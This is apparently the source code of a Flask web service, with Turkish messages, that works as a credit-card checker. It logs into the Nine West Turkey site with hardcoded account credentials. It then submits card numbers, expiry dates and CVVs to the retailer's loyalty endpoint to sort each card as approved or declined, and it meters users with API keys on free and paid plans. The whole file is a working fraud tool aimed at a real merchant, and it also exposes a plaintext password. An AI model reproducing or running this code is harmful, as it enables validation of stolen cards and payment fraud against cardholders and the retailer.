from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests, re, threading, urllib3, os, time, json, hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "users.json")

def _db_load():
    if not os.path.exists(DB_PATH):
        return {}
    try:
        return json.load(open(DB_PATH, "r", encoding="utf-8"))
    except Exception:
        return {}

def _db_save(d):
    try:
        json.dump(d, open(DB_PATH, "w", encoding="utf-8"), indent=2, ensure_ascii=False)
    except Exception:
        pass

def _gen_key(user):
    raw = f"{user}-{time.time()}-{os.urandom(8).hex()}"
    return "PH_" + hashlib.sha256(raw.encode()).hexdigest()[:32]

def register_user(user, plan="free"):
    d = _db_load()
    if user in d:
        return True, "zaten var", d[user]["key"], d[user]["limit"], d[user]["used"]
    key = _gen_key(user)
    limit = 50 if plan == "free" else 99999
    d[user] = {"key": key, "plan": plan, "limit": limit, "used": 0, "created": int(time.time()), "last_used": 0}
    _db_save(d)
    return True, "kayit ok", key, limit, 0

def auth_and_consume(key):
    d = _db_load()
    for u, v in d.items():
        if v.get("key") == key:
            if v.get("used", 0) >= v.get("limit", 0):
                return False, "limit doldu", u, v
            v["used"] = v.get("used", 0) + 1
            v["last_used"] = int(time.time())
            _db_save(d)
            return True, "ok", u, v
    return False, "gecersiz key", None, None

def detect_brand(pan):
    if not pan: return "BILINMIYOR"
    if pan.startswith("4"): return "VISA"
    if re.match(r"^5[1-5]", pan) or re.match(r"^2[2-7]", pan): return "MASTERCARD"
    if re.match(r"^3[47]", pan): return "AMEX"
    if re.match(r"^6(?:011|5)", pan): return "DISCOVER"
    if re.match(r"^9792", pan): return "TROY"
    return "BILINMIYOR"

def detect_country(pan):
    if not pan: return "BILINMIYOR"
    if pan.startswith("9792"): return "TURKEY TR"
    if pan.startswith(("4","5","2")): return "GLOBAL"
    return "BILINMIYOR"

LOGIN_EMAIL = "senbensenbena8@gmail.com"
LOGIN_PASSWORD = "qazxcvbnm12A"
HASH = "aa217a6339"

H = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36", 'Accept-Encoding': "gzip, deflate, br, zstd", 'Content-Type': "application/json", 'sec-ch-ua-platform': "\"Android\"", 'sec-ch-ua': "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"", 'sec-ch-ua-mobile': "?1", 'accept-language': "tr,en-US;q=0.9,en;q=0.8,de;q=0.7"}
LU = "https://www.ninewest.com.tr/webservice/v1/login"
LP = {"email": LOGIN_EMAIL, "password": LOGIN_PASSWORD, "g-recaptcha-response": None, "version": 3, "hash": HASH}
LH = {'origin': "https://www.ninewest.com.tr", 'referer': "https://www.ninewest.com.tr/customer/login", 'sec-fetch-site': "same-origin", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty", 'web-platform': "nextjs"}
CU = "https://checkout-be.ninewest.com.tr/webservice/v1/retrievecardloyalty"

_cs, _bh, _rc = None, "", 0
_lk = threading.Lock()
RPS = 5

def gas(force=False):
    global _cs, _bh, _rc
    with _lk:
        if not force and _cs is not None and _rc < RPS:
            _rc += 1
            return _cs, _bh
        s = requests.Session()
        a = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
        s.mount("https://", a); s.mount("http://", a)
        s.headers.update(H)
        try:
            s.post(LU, json=LP, headers=LH, timeout=7, verify=False)
            _bh = s.cookies.get('basket_hash', '')
            _cs = s; _rc = 1
        except Exception:
            _bh = ""; _cs = s; _rc = 1
        return _cs, _bh

def check_card(cin):
    t0 = time.time()
    m = re.search(r'(\d{15,19})[\s|/:-]+(\d{1,2})[\s|/:-]+(\d{2,4})(?:[\s|/:-]+(\d{3,4}))?', cin)
    if m:
        pan, em, eyr = m.group(1), m.group(2).zfill(2), m.group(3)
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = m.group(4) if m.group(4) else "000"
    else:
        p = cin.strip().split('|')
        if len(p) < 3:
            return {"result": "declined", "raw": "Format Hatali", "reward": 0.0, "cc": cin, "pan": "", "sure": 0.0}
        pan, em, eyr = p[0].strip().replace(' ', ''), p[1].strip().zfill(2), p[2].strip()
        ey = eyr[-2:]; eyf = ("20" + ey) if len(eyr) == 2 else eyr
        cvv = p[3].strip() if len(p) >= 4 else "000"
    cs = f"{pan}|{em}|{ey}|{cvv}"
    s, bh = gas()
    fp = " ".join([pan[i:i+4] for i in range(0, len(pan), 4)])
    pl = {"cc_number": fp, "cc_cvv": cvv if cvv else "000", "cc_month": em, "cc_year": eyf}
    hh = {'Accept': "application/json, text/plain, */*", 'shoppingcartid': str(bh), 'platform': "MOBILEWEB", 'origin': "https://checkout.ninewest.com.tr", 'referer': "https://checkout.ninewest.com.tr/", 'sec-fetch-site': "same-site", 'sec-fetch-mode': "cors", 'sec-fetch-dest': "empty"}
    try:
        r = s.post(CU, json=pl, headers=hh, timeout=7, verify=False)
        d = r.json()
    except Exception as e:
        return {"result": "error", "raw": str(e), "reward": 0.0, "cc": cs, "pan": pan, "sure": round(time.time()-t0, 2)}
    sure = round(time.time() - t0, 2)
    try:
        sc = d.get("status", {}).get("code")
        msg = d.get("status", {}).get("message") or d.get("message") or d.get("error") or str(d)
        if isinstance(msg, str):
            tr = str.maketrans("çğıöşüÇĞİÖŞÜ", "cgiosuCGIOSU"); msg = msg.translate(tr).strip()
        if sc == 200:
            rw = d.get("data", {}).get("cardRewardMoney", 0.0)
            try: rv = float(rw)
            except: rv = 0.0
            if rv > 0.0:
                return {"result": "approved", "raw": f"Approved! - {rw} TRY Puan!", "reward": rv, "cc": cs, "pan": pan, "sure": sure}
            return {"result": "declined", "raw": msg, "reward": 0.0, "cc": cs, "pan": pan, "sure": sure}
        return {"result": "declined", "raw": msg, "reward": 0.0, "cc": cs, "pan": pan, "sure": sure}
    except Exception as e:
        return {"result": "error", "raw": str(e), "reward": 0.0, "cc": cs, "pan": pan, "sure": sure}

def build_response(r, user, remaining, used, limit):
    pan = r.get("pan", "")
    brand = detect_brand(pan)
    country = detect_country(pan)
    emoji = "✅" if r["result"] == "approved" else "❌"
    display = (
        f"Card Check V55:\n{emoji} {r['result'].capitalize()}\n"
        f"★━━━━━━━━━━━━━━━━━━━★\n"
        f"ℹ️ Result: cc: {r['cc']} -> {r['result'].capitalize()}! - ({r['raw']})\n\n"
        f"🛠️ Gate: Ninewest Loyalty\n"
        f"⏳ Sure: {r.get('sure', 0)}s\n"
        f"👤 User: @{user}\n"
        f"★━━━━━━━━━━━━━━━━━━━★\n"
        f"🚀 ProHosts Card Checker\n\n"
        f"💳 Card: {pan}\n"
        f"ℹ️ Result: {r['raw']}\n\n"
        f"⚡ Brand: {brand}\n"
        f"🌐 Country: {country}\n"
        f"👤 By: @{user}\n"
        f"🛠️ Gate: Ninewest\n"
        f"💰 Kalan: {remaining}\n"
    )
    return {
        "status": r["result"] in ("approved", "declined"),
        "gateway": "Ninewest Loyalty",
        "card": pan,
        "cc": r["cc"],
        "result": r["result"],
        "reward": r.get("reward", 0),
        "brand": brand,
        "country": country,
        "raw": r["raw"],
        "display": display,
        "refunded": False,
        "user_info": {"user": user, "limit": limit, "used": used, "remaining": remaining}
    }

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": True, "msg": "alive"})

@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        b = request.get_json(force=True, silent=True) or {}
        u = b.get("user") or b.get("username")
        plan = b.get("plan", "free")
    else:
        u = request.args.get("user") or request.args.get("username")
        plan = request.args.get("plan", "free")
    if not u:
        u = "user_" + os.urandom(4).hex()
    ok, msg, key, limit, used = register_user(u, plan)
    return jsonify({"status": True, "user": u, "key": key, "limit": limit, "used": used, "msg": msg})

@app.route("/adv3", methods=["GET"])
def adv3():
    api = request.args.get("api") or request.headers.get("X-API-Key")
    cc = request.args.get("card") or request.args.get("cc")
    if not api:
        return jsonify({"status": False, "error": "api key yok"}), 401
    if not cc:
        return jsonify({"status": False, "error": "card yok"}), 400
    ok, msg, user, info = auth_and_consume(api)
    if not ok:
        return jsonify({"status": False, "error": msg}), 401
    r = check_card(cc)
    remaining = info["limit"] - info["used"]
    return jsonify(build_response(r, user, remaining, info["used"], info["limit"]))

@app.route("/check", methods=["POST"])
def check():
    b = request.get_json(force=True, silent=True) or {}
    api = b.get("api") or b.get("key") or request.headers.get("X-API-Key")
    cc = b.get("cc") or b.get("card") or request.form.get("cc")
    if not api:
        return jsonify({"status": False, "error": "api key yok"}), 401
    if not cc:
        return jsonify({"status": False, "error": "cc yok"}), 400
    ok, msg, user, info = auth_and_consume(api)
    if not ok:
        return jsonify({"status": False, "error": msg}), 401
    r = check_card(cc)
    remaining = info["limit"] - info["used"]
    return jsonify(build_response(r, user, remaining, info["used"], info["limit"]))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
